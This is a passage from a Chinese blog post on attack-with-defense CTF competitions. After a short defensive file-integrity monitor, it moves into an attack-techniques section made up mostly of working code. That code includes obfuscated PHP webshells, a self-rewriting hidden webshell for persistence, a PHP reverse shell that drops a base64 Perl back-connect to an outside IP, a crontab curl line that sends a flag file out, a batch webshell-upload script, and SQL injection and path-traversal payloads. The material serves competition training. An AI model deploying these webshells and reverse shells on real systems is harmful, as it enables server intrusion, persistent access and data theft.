class="function"><span class="keyword">def</span> <span class="title">getfilemd5dict</span><span class="params">(filelist = [])</span>:</span></div><div class="line">    filemd5dict = &#123;&#125;</div><div class="line">    <span class="keyword">for</span> ori_file <span class="keyword">in</span> filelist:</div><div class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> ori_file:</div><div class="line">            md5 = calcMD5(os.path.realpath(ori_file))</div><div class="line">            <span class="keyword">if</span> md5:</div><div class="line">                filemd5dict[ori_file] = md5</div><div class="line">    <span class="keyword">return</span> filemd5dict</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 备份所有文件</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">backup_file</span><span class="params">(filelist=[])</span>:</span></div><div class="line">    <span class="comment"># if len(os.listdir(Special_path['bak'])) == 0:</span></div><div class="line">    <span class="keyword">for</span> filepath <span class="keyword">in</span> filelist:</div><div class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> filepath:</div><div class="line">            shutil.copy2(filepath, Special_path[<span class="string">'bak'</span>])</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">u'---------start------------'</span></div><div class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> Special_path:</div><div class="line">        mkdir_p(Special_path[value])</div><div class="line">    <span class="comment"># 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span></div><div class="line">    ORIGIN_FILE_LIST = getfilelist(CWD)</div><div class="line">    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)</div><div class="line">    backup_file(ORIGIN_FILE_LIST) <span class="comment"># TODO 备份文件可能会产生重名BUG</span></div><div class="line">    <span class="keyword">print</span> <span class="string">u'[*] pre work end!'</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        file_list = getfilelist(CWD)</div><div class="line">        <span class="comment"># 移除新上传文件</span></div><div class="line">        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))</div><div class="line">        <span class="keyword">if</span> len(diff_file_list) != <span class="number">0</span>:</div><div class="line">            <span class="comment"># import pdb;pdb.set_trace()</span></div><div class="line">            <span class="keyword">for</span> filepath <span class="keyword">in</span> diff_file_list:</div><div class="line">                <span class="keyword">try</span>:</div><div class="line">                    f = open(filepath, <span class="string">'r'</span>).read()</div><div class="line">                <span class="keyword">except</span> Exception, e:</div><div class="line">                    <span class="keyword">break</span></div><div class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</div><div class="line">                    <span class="keyword">try</span>:</div><div class="line">                        <span class="keyword">print</span> <span class="string">u'[*] webshell find : '</span> + getUnicode(filepath)</div><div class="line">                        shutil.move(filepath, os.path.join(Special_path[<span class="string">'webshell'</span>], ntpath.basename(filepath) + <span class="string">'.txt'</span>))</div><div class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">                        <span class="keyword">print</span> <span class="string">u'[!] move webshell error, "%s" maybe is webshell.'</span>%getUnicode(filepath)</div><div class="line">                    <span class="keyword">try</span>:</div><div class="line">                        f = open(os.path.join(Special_path[<span class="string">'log'</span>], <span class="string">'log.txt'</span>), <span class="string">'a'</span>)</div><div class="line">                        f.write(<span class="string">'newfile: '</span> + getUnicode(filepath) + <span class="string">' : '</span> + str(time.ctime()) + <span class="string">'\n'</span>)</div><div class="line">                        f.close()</div><div class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">                        <span class="keyword">print</span> <span class="string">u'[-] log error : file move error: '</span> + getUnicode(e)</div><div class="line"></div><div class="line">        <span class="comment"># 防止任意文件被修改,还原被修改文件</span></div><div class="line">        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)</div><div class="line">        <span class="keyword">for</span> filekey <span class="keyword">in</span> md5_dict:</div><div class="line">            <span class="keyword">if</span> md5_dict[filekey] != FILE_MD5_DICT[filekey]:</div><div class="line">                <span class="keyword">try</span>:</div><div class="line">                    f = open(filekey, <span class="string">'r'</span>).read()</div><div class="line">                <span class="keyword">except</span> Exception, e:</div><div class="line">                    <span class="keyword">break</span></div><div class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</div><div class="line">                    <span class="keyword">try</span>:</div><div class="line">                        <span class="keyword">print</span> <span class="string">u'[*] file had be change : '</span> + getUnicode(filekey)</div><div class="line">                        shutil.move(filekey, os.path.join(Special_path[<span class="string">'difffile'</span>], ntpath.basename(filekey) + <span class="string">'.txt'</span>))</div><div class="line">                        shutil.move(os.path.join(Special_path[<span class="string">'bak'</span>], ntpath.basename(filekey)), filekey)</div><div class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">                        <span class="keyword">print</span> <span class="string">u'[!] move webshell error, "%s" maybe is webshell.'</span>%getUnicode(filekey)</div><div class="line">                    <span class="keyword">try</span>:</div><div class="line">                        f = open(os.path.join(Special_path[<span class="string">'log'</span>], <span class="string">'log.txt'</span>), <span class="string">'a'</span>)</div><div class="line">                        f.write(<span class="string">'diff_file: '</span> + getUnicode(filekey) + <span class="string">' : '</span> + getUnicode(time.ctime()) + <span class="string">'\n'</span>)</div><div class="line">                        f.close()</div><div class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">                        <span class="keyword">print</span> <span class="string">u'[-] log error : done_diff: '</span> + getUnicode(filekey)</div><div class="line">                        <span class="keyword">pass</span></div><div class="line">        time.sleep(<span class="number">2</span>)</div><div class="line">        <span class="comment"># print '[*] ' + getUnicode(time.ctime())</span></div><div class="line">七、自动提交</div></pre></td></tr></table></figure><h3 id="0x04-攻击技巧"><a href="#0x04-攻击技巧" class="headerlink" title="0x04 攻击技巧"></a>0x04 攻击技巧</h3><p>1.拿到命令执行漏洞后执行crontab</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 参考</span></div><div class="line"><span class="comment"># http://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html</span></div><div class="line">*/5 * * * * curl 172.16.100.5:9000/submit_flag/ <span class="_">-d</span> <span class="string">'flag='</span>$(cat /home/web/flag/flag)<span class="string">'&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY'</span></div></pre></td></tr></table></figure><p>2.注意源码中或者备份文件中是否存在mysql等的弱口令</p><p>3.主机发现</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 使用httpscan脚本</span></div><div class="line">./httpscan.py 172.16.0.0/24 –t 10</div><div class="line"><span class="comment"># masscan</span></div><div class="line">masscan -p 80 172.16.0.0/24</div><div class="line"><span class="comment"># nmap</span></div><div class="line">nmap –sn 172.16.0.0/24</div></pre></td></tr></table></figure><p>4.常用的特殊webshell</p><p>控制用的一句话木马，最好是需要菜刀配置的，这样做是为了不让别人轻易的利用你的一句话，要不然就只能等着别人用你的脚本捡分。<br>简单举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> ($_=@$_GET[<span class="number">2</span>]).@$_($_POST[<span class="number">1</span>])<span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>连接方式：php?2=assert密码是1。<br>献上我常用得一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$a=chr(<span class="number">96</span>^<span class="number">5</span>);</div><div class="line">$b=chr(<span class="number">57</span>^<span class="number">79</span>);</div><div class="line">$c=chr(<span class="number">15</span>^<span class="number">110</span>);</div><div class="line">$d=chr(<span class="number">58</span>^<span class="number">86</span>);</div><div class="line">$e=<span class="string">'($_REQUEST[C])'</span>;</div><div class="line">@assert($a.$b.$c.$d.$e);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>使用为<code>?C=phpinfo();</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $sF=<span class="string">"PCT4BA6ODSE_"</span>;$s21=strtolower($sF[<span class="number">4</span>].$sF[<span class="number">5</span>].$sF[<span class="number">9</span>].$sF[<span class="number">10</span>].$sF[<span class="number">6</span>].$sF[<span class="number">3</span>].$sF[<span class="number">11</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>].$sF[<span class="number">1</span>].$sF[<span class="number">7</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>]);$s22=$&#123;strtoupper($sF[<span class="number">11</span>].$sF[<span class="number">0</span>].$sF[<span class="number">7</span>].$sF[<span class="number">9</span>].$sF[<span class="number">2</span>])&#125;[<span class="string">'n985de9'</span>];<span class="keyword">if</span>(<span class="keyword">isset</span>($s22))&#123;<span class="keyword">eval</span>($s21($s22));&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>配置填<code>n985de9=QGV2YWwoJF9QT1NUWzBdKTs=</code><br>连接密码:0（零）</p><p>5.权限维持</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    set_time_limit(<span class="number">0</span>);</div><div class="line">    ignore_user_abort(<span class="keyword">true</span>);</div><div class="line"></div><div class="line">$file = <span class="string">'.conifg.php'</span>;</div><div class="line">$shell = <span class="string">"&lt;?php echo system("</span>curl <span class="number">10.0</span><span class="number">.0</span><span class="number">.2</span><span class="string">"); ?&gt;"</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</div><div class="line">        file_put_contents($file, $shell);</div><div class="line">        system(<span class="string">'chmod 777 .demo.php'</span>);</div><div class="line"></div><div class="line">        usleep(<span class="number">50</span>);</div><div class="line">        &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>tips:<code>.config.php</code>前面使用一个点，能很好的隐藏文件。<br>想要结束这个进程，除了最暴力的重启apache服务之外，更为优雅的如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</div><div class="line">$pid=<span class="number">1234</span>;</div><div class="line">@unlink(<span class="string">'.config.php'</span>);</div><div class="line">exec(<span class="string">'kill -9 $pid'</span>);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>先查看进程，查看对应的pid，再执行即可。</p><p>素质低的人则会放置一个md5马，比如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(md5($_POST[<span class="string">'pass'</span>])==<span class="string">'d8d1a1efe0134e2530f503028a825253'</span>)</div><div class="line">@<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>如果素质低的人又很猥琐，像<a href="http://blog.163.com/passw0a_d/blog/static/2508070612017613113859691/" target="_blank" rel="external">rootrain</a>这种就是。那就是利用<code>header</code>，最后综合起来就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> <span class="string">'hello'</span>;</div><div class="line"><span class="keyword">if</span>(md5($_POST[<span class="string">'pass'</span>])==<span class="string">'d8d1a1efe0134e2530f503028a825253'</span>)</div><div class="line"><span class="keyword">if</span> (@$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>] == <span class="string">'flag'</span>)&#123;</div><div class="line">$test= <span class="string">'flag'</span>;</div><div class="line">    header(<span class="string">"flag:$test"</span>);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>放进<code>config.php</code>效果最好，因为一般很少人去看这个。</p><p>还可以采用反弹shell的方式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">which</span><span class="params">($pr)</span> </span>&#123; </div><div class="line">$path = execute(<span class="string">"which $pr"</span>); </div><div class="line"><span class="keyword">return</span> ($path ? $path : $pr); </div><div class="line">&#125; </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($cfe)</span> </span>&#123; </div><div class="line">$res = <span class="string">''</span>; </div><div class="line"><span class="keyword">if</span> ($cfe) &#123; </div><div class="line"><span class="keyword">if</span>(function_exists(<span class="string">'exec'</span>)) &#123; </div><div class="line">@exec($cfe,$res); </div><div class="line">$res = join(<span class="string">"\n"</span>,$res); </div><div class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'shell_exec'</span>)) &#123; </div><div class="line">$res = @shell_exec($cfe); </div><div class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'system'</span>)) &#123; </div><div class="line">@ob_start(); </div><div class="line">@system($cfe); </div><div class="line">$res = @ob_get_contents(); </div><div class="line">@ob_end_clean(); </div><div class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'passthru'</span>)) &#123; </div><div class="line">@ob_start(); </div><div class="line">@passthru($cfe); </div><div class="line">$res = @ob_get_contents(); </div><div class="line">@ob_end_clean(); </div><div class="line">&#125; <span class="keyword">elseif</span>(@is_resource($f = @popen($cfe,<span class="string">"r"</span>))) &#123; </div><div class="line">$res = <span class="string">''</span>; </div><div class="line"><span class="keyword">while</span>(!@feof($f)) &#123; </div><div class="line">$res .= @fread($f,<span class="number">1024</span>); </div><div class="line">&#125; </div><div class="line">@pclose($f); </div><div class="line">&#125; </div><div class="line">&#125; </div><div class="line"><span class="keyword">return</span> $res; </div><div class="line">&#125; </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">cf</span><span class="params">($fname,$text)</span></span>&#123; </div><div class="line"><span class="keyword">if</span>($fp=@fopen($fname,<span class="string">'w'</span>)) &#123; </div><div class="line">@fputs($fp,@base64_decode($text)); </div><div class="line">@fclose($fp); </div><div class="line">&#125; </div><div class="line">&#125; </div><div class="line">$yourip = <span class="string">"192.168.71.1"</span>; </div><div class="line">$yourport = <span class="string">'9999'</span>; </div><div class="line">$usedb = <span class="keyword">array</span>(<span class="string">'perl'</span>=&gt;<span class="string">'perl'</span>,<span class="string">'c'</span>=&gt;<span class="string">'c'</span>); </div><div class="line">$back_connect=<span class="string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span>. </div><div class="line"><span class="string">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span>. </div><div class="line"><span class="string">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span>. </div><div class="line"><span class="string">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span>. </div><div class="line"><span class="string">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span>. </div><div class="line"><span class="string">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span>. </div><div class="line"><span class="string">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span>; </div><div class="line">cf(<span class="string">'/tmp/.bc'</span>,$back_connect); </div><div class="line">$res = execute(which(<span class="string">'perl'</span>).<span class="string">" /tmp/.bc $yourip $yourport &amp;"</span>); </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>之后本地执行<code>nc -lp 9999</code>即可</p><p>6.获取flag的方式</p><p>(1) 批量传webshell(shell的内容可以写为权限维持部分的那个脚本)，之后结合批量访问 参考<a href="http://rcoil.me/2017/05/PHP-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/" target="_blank" rel="external">PHP-定时任务</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 参考 http://www.freebuf.com/sectool/91082.html</span></div><div class="line"><span class="comment">#!/usr/bin/python  </span></div><div class="line"><span class="comment">#coding=utf-8  </span></div><div class="line">  </div><div class="line">import urllib  </div><div class="line">import urllib2</div><div class="line">import sys</div><div class="line">import base64</div><div class="line">import re</div><div class="line">  </div><div class="line">def post(url, data):  </div><div class="line">    req = urllib2.Request(url)  </div><div class="line">    data = urllib.urlencode(data)   </div><div class="line">    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())  </div><div class="line">    response = opener.open(req, data)  </div><div class="line">    <span class="built_in">return</span> response.read()  </div><div class="line"></div><div class="line">def get_shell_path(posturl,passwd):</div><div class="line">    shell_path = <span class="string">""</span></div><div class="line">    try:</div><div class="line">        data = &#123;&#125;</div><div class="line">        data[passwd] = <span class="string">'@eval(base64_decode($_POST[z0]));'</span></div><div class="line">        data[<span class="string">'z0'</span>]=<span class="string">'ZWNobyAkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ107'</span></div><div class="line">        shell_path = post(posturl, data).strip()</div><div class="line">    except Exception:</div><div class="line">        pass</div><div class="line">    <span class="built_in">return</span> shell_path</div><div class="line">  </div><div class="line">def main():</div><div class="line">    <span class="built_in">print</span> <span class="string">'\n+++++++++Batch Uploading Local File (Only for PHP webshell)++++++++++\n'</span></div><div class="line">    shellfile = sys.argv[1] <span class="comment"># 存放webshell路径和密码的文件</span></div><div class="line">    localfile = sys.argv[2] <span class="comment"># 本地待上传的文件名</span></div><div class="line">    shell_file = open(shellfile,<span class="string">'rb'</span>)</div><div class="line">    local_content = str(open(localfile,<span class="string">'rb'</span>).read())</div><div class="line">    <span class="keyword">for</span> eachline <span class="keyword">in</span> shell_file:</div><div class="line">        posturl = eachline.split(<span class="string">','</span>)[0].strip()</div><div class="line">        passwd = eachline.split(<span class="string">','</span>)[1].strip()</div><div class="line">        try:</div><div class="line">            reg = <span class="string">".*/([^/]*\.php?)"</span></div><div class="line">            match_shell_name = re.search(reg,eachline)</div><div class="line">            <span class="keyword">if</span> match_shell_name:</div><div class="line">                shell_name=match_shell_name.group(1)</div><div class="line">                shell_path = get_shell_path(posturl,passwd).strip()</div><div class="line">                target_path = shell_path.split(shell_name)[0]+localfile</div><div class="line">                target_path_base64 = base64.b64encode(target_path)</div><div class="line">                target_file_url = eachline.split(shell_name)[0]+localfile</div><div class="line">                data = &#123;&#125;</div><div class="line">                data[passwd] = <span class="string">'@eval(base64_decode($_POST[z0]));'</span></div><div class="line">                data[<span class="string">'z0'</span>]=<span class="string">'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzsKJGY9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOwokYz1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejIiXSk7CiRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOwokYz1zdHJfcmVwbGFjZSgiXG4iLCIiLCRjKTsKJGJ1Zj0iIjsKZm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MSkKICAgICRidWYuPXN1YnN0cigkYywkaSwxKTsKZWNobyhAZndyaXRlKGZvcGVuKCRmLCJ3IiksJGJ1ZikpOwplY2hvKCJ8PC0iKTsKZGllKCk7'</span></div><div class="line">                data[<span class="string">'z1'</span>]=target_path_base64</div><div class="line">                data[<span class="string">'z2'</span>]=base64.b64encode(local_content)</div><div class="line">                response = post(posturl, data)</div><div class="line">                <span class="keyword">if</span> response:</div><div class="line">                    <span class="built_in">print</span> <span class="string">'[+] '</span>+target_file_url+<span class="string">', upload succeed!'</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    <span class="built_in">print</span> <span class="string">'[-] '</span>+target_file_url+<span class="string">', upload failed!'</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="built_in">print</span> <span class="string">'[-] '</span>+posturl+<span class="string">', unsupported webshell!'</span></div><div class="line">        except Exception,e:</div><div class="line">            <span class="built_in">print</span> <span class="string">'[-] '</span>+posturl+<span class="string">', connection failed!'</span></div><div class="line">    shell_file.close()</div><div class="line">  </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:  </div><div class="line">    main()</div></pre></td></tr></table></figure><p>(2) 或者直接执行下面的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"><span class="keyword">while</span> <span class="literal">true</span></div><div class="line"><span class="keyword">do</span></div><div class="line">flag=$(curl <span class="string">'http://172.16.4.42:800'</span>)</div><div class="line">curl --cookie <span class="string">"PHPSESSID=21il7pum6i3781pumljhv578c1; xdgame_username=%E5%B0%8F%E7%BA%A2%E5%B8%BD"</span> --data <span class="string">"key="</span><span class="variable">$&#123;flag&#125;</span> <span class="string">"http://172.16.4.42/index.php/wargame/submit"</span></div><div class="line">sleep 1s</div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure><p>(3) 有些SQL注入漏洞可以通过sqlmap利用—sql-shell 执行<code>select load_file(&#39;/flag&#39;)</code>来获取flag。最好直接利用脚本来获得。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqli</span><span class="params">(host)</span>:</span></div><div class="line">    <span class="keyword">global</span> sess_admin</div><div class="line">    data = &#123;<span class="string">"section_name"</span>:<span class="string">"asd"</span>,<span class="string">"admin_name"</span>:<span class="string">"'||(SELECT updatexml(1,concat(0x7e,(select load_file('/flag')),0x7e),1))||'"</span>,<span class="string">"announcement"</span>:<span class="string">"asd"</span>&#125;</div><div class="line">    r = sess_admin.post(<span class="string">'http://%s/index.php/section/add'</span>%host,data=data)</div><div class="line">    flags = re.findall(<span class="string">r'~(.+?)~'</span>,r.content)</div><div class="line">    <span class="keyword">if</span> flags:</div><div class="line">        <span class="keyword">return</span> flags[<span class="number">0</span>]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">"error pwn!"</span></div></pre></td></tr></table></figure><p>(4) 文件包含漏洞，直接可以通过../../../../../../flag的方式获取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">def include(host):</div><div class="line">    r = requests.get(url=<span class="string">"http://%s/?t=../../../../../../flag"</span>%host)</div><div class="line">    flags = re.findall(r<span class="string">'^(.+?)&lt;'</span>,r.content)</div><div class="line">    <span class="keyword">if</span> flags:</div><div class="line">        <span class="built_in">return</span> flags[0]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="built_in">return</span> <span class="string">"error pwn!"</span></div></pre></td></tr></table></figure><p>(5)批量提交flag的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"><span class="keyword">import</span> httplib</div><div class="line">server_host = <span class="string">'10.10.0.2'</span></div><div class="line">server_port = <span class="number">80</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(team_token, flag, host=server_host, port=server_port, timeout=<span class="number">5</span>)</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> team_token <span class="keyword">or</span> <span class="keyword">not</span> flag:</div><div class="line">        <span class="keyword">raise</span> Exception(<span class="string">'team token or flag not found'</span>)</div><div class="line">    conn = httplib.HTTPConnection(host, port, timeout=timeout)</div><div class="line">    params = urllib.urlencode(&#123;</div><div class="line">        <span class="string">'token'</span>: team_token,</div><div class="line">        <span class="string">'flag'</span>: flag,</div><div class="line">    &#125;)</div><div class="line">    headers = &#123;</div><div class="line">        <span class="string">"Content-type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></div><div class="line">    &#125;</div><div class="line">    conn.request(<span class="string">'POST'</span>, <span class="string">'/api/submit_flag'</span>, params, headers)</div><div class="line">    response = conn.getresponse()</div><div class="line">    data = response.read()</div><div class="line">    <span class="keyword">return</span> json.loads(data)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'usage: ./submitflag.py $team_token $flag'</span></div><div class="line">        